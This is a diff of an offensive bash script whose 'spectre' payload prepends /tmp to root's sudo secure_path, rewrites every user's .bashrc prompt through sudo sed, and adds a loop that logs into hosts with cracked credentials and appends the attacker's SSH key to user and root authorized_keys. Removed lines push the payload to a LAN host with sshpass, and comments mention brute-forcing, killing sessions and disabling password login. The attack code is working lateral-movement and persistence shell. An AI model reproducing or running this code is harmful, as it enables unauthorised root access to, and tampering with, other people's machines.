@@ -30,16 +30,16 @@
 #### RUN function #####
 #######################
 function main(){	###
-#	neo				###
-#	meat			###
-#	bones			###
-#	brute			###
-	spectre			###
+	neo				###
+	meat			###
+	bones			###
+	brute			###
+#	spectre			###
 }					###
 #######################
 #------ error handling ----------
 ### If error, give up			#
-set -e							#
+#set -e							#
 #- - - - - - - - - - - - - - - -#
 ### if error, do THING			#
 # makes trap global 			#
@@ -188,7 +188,7 @@ function brute(){
 ###########################################################################################
 ### wont be clearing logs or trying to hide footprints at all ###
 function spectre(){
-	#### launcher ###########
+	#### launch bay #########
 	function payload(){		#
 		fuck 				#
 	#	unfuck				#
@@ -204,19 +204,19 @@ function spectre(){
 			ubuDirtyRootPATH='secure_path="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"'
 			ubuDirtyUserPATH='PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"'
 		# BOTH
-			#bothCleanColor53PS1='PS1="${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ "'
-			#bothCleanBasic55PS1='PS1="${debian_chroot:+($debian_chroot)}\u@\h:\w\$ "'
-			#bothCleanXterm62PS1='PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"'
-		bothCleanColor53PS1='PS1="${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ "'
-		bothCleanBasic55PS1='PS1="${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ "'
-		bothCleanXterm62PS1='PS1="\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1"'
+			#bothCleanColorPS1='PS1="${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ "'
+			#bothCleanBasicPS1='PS1="${debian_chroot:+($debian_chroot)}\u@\h:\w\$ "'
+			#bothCleanXtermPS1='PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"'
+		bothCleanColorPS1='PS1="${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ "'
+		bothCleanBasicPS1='PS1="${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ "'
+		bothCleanXtermPS1='PS1="\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1"'
 
-		bothCleanPS1Vars='$bothCleanColor53PS1 $bothCleanBasic55PS1 $bothCleanXterm62PS1'
+		bothCleanPS1Vars='$bothCleanColorPS1 $bothCleanBasicPS1 $bothCleanXtermPS1'
 
-			bothDirtyPS1Vars='$bothDirtyColor53PS1 $bothDirtyBasic55PS1 $bothDirtyXterm62PS1'
-			bothDirtyColor53PS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
-			bothDirtyBasic55PS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
-			bothDirtyXterm62PS1='PS1="\\[\\e]0;${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h: \\w\\a\\]$PS1"'
+			bothDirtyPS1Vars='$bothDirtyColorPS1 $bothDirtyBasicPS1 $bothDirtyXtermPS1'
+			bothDirtyColorPS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
+			bothDirtyBasicPS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
+			bothDirtyXtermPS1='PS1="\\[\\e]0;${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h: \\w\\a\\]$PS1"'
 		# Debian
 		debPATH="/etc/profile"
 		debCleanRootPATH='PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"'
@@ -242,9 +242,9 @@ function spectre(){
 ### fuck ##########################################
 	function fuck(){
 #################
-	seeder		#
+	#seeder		#
 	#sandman	#
-	#terminator	#
+	terminator	#
 #################
 	### is Debian ###
 		if [ $osDetect == "Debian" ]; then
@@ -264,7 +264,7 @@ function spectre(){
 			#colorizing bash shell
 				userList=$(find /home /root -name .bashrc)
 				for rc in $userList;do
-					sudo sed -i "s/.*PS1.*/$bothDirtyBasic55PS1/g" $rc
+					sudo sed -i "s/.*PS1.*/$bothDirtyBasicPS1/g" $rc
 				done
 			fi
 	}
@@ -329,7 +329,13 @@ function spectre(){
 		#disables password login for ssh (making it obvious something is wrong)
 
 		#adding self to target's root auth list
-		#cat ~/.ssh/id_rsa.pub | ssh USER@TARGETIP 'echo "PASSWORD" | sudo -S mkdir -p ~/.ssh /root/.ssh && cat | tee -a ~/.ssh/authorized_keys /root/.ssh/authorized_keys'
+		for tango in "$crackedLogins"; do
+			local target="$(cut -d" " -f1 $tango)"
+			local username="$(cut -d" " -f2 $tango)"
+			local password="$(cut -d" " -f3 $tango)"
+			#jumping into each box and letting loose the plague
+			cat ~/.ssh/id_rsa.pub | ssh $username@$target "echo $password | sudo -S mkdir -p ~/.ssh /root/.ssh && cat | tee -a ~/.ssh/authorized_keys /root/.ssh/authorized_keys"
+		done
 	}
 
 
@@ -337,18 +343,10 @@ function spectre(){
 #** Terminator ####################################
 	function terminator(){
 	#### sending the payload ####
-	sshpass -p hi ssh -o StrictHostKeyChecking=no norm@192.168.86.28 "$(declare -f spectre); spectre"
-		# auto ssh login
-			#sshpass -p "PASSWORD" ssh -o StrictHostKeyChecking=no USER@IP
-		# run function on target machine
-			#ssh root@MachineB "$(declare -f spectre); spectre"
-		# combo
-			##doesn'twork###sshpass -p "PASSWORD" ssh -o StrictHostKeyChecking=no USER@IP "$(declare -f spectre; echo PASSWORD | su -)"
-			##have to add fucking sudo to everything
-				#function sshcontrol(){
-				#echo hi | sudo -S mkdir -p /root/pleasejustowrk
-				#}
-				#sshpass -p hi ssh -o StrictHostKeyChecking=no norm@192.168.86.28 "$(declare -f sshcontrol); sshcontrol"
+	#just testing seeder
+#	ssh 192.168.86.28 "$(declare -f seeder); seeder"
+		# looping through targets
+
 	#### killing sessions ####
 #		killTargets=$(who -u | grep -v $attackDog | awk '{print $6}')
 #		for target in $killTargets; do
